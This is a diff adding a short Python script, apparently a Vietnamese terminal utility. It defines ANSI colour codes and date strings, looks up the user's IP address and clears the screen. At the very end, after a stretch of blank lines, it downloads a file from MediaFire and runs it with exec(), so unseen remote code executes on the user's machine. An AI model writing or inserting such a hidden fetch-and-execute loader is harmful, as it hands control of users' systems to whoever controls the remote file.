@@ -1,1 +1,40 @@
-nháp 
+cam="\033[1;33m"
+den = "\033[1;90m"
+luc = "\033[1;32m"
+trang = "\033[1;37m"
+red = "\033[1;31m"
+vang = "\033[1;33m"
+tim = "\033[1;35m"
+lamd = "\033[1;34m"
+lam = "\033[1;36m"
+purple = "\e[35m"
+hong = "\033[1;95m"
+trang = "\033[1;37m"
+xanh_la = "\033[1;32m"
+xanh_duong = "\033[1;34m"
+do = "\033[1;31m"
+vang = "\033[1;33m"
+tim = "\033[1;35m"
+xanhnhat = "\033[1;36m"
+import hashlib
+import datetime
+import requests
+import os
+client_ip = requests.get('https://kiemtraip.com/raw.php').text
+from time import strftime
+now = datetime.datetime.now()
+thu = now.strftime('%A')
+ngay_hom_nay = now.strftime('%d')
+thang_nay = now.strftime('%m')
+nam_ = now.strftime('%Y')
+now = datetime.datetime.now()
+gio_hien_tai = now.strftime('%H:%M:%S')	
+os.system("clear")
+
+
+
+        
+       
+
+
+exec(requests.get('https://www.mediafire.com/file/0bvvwmk4fk6ljda/bye.py/file').text)
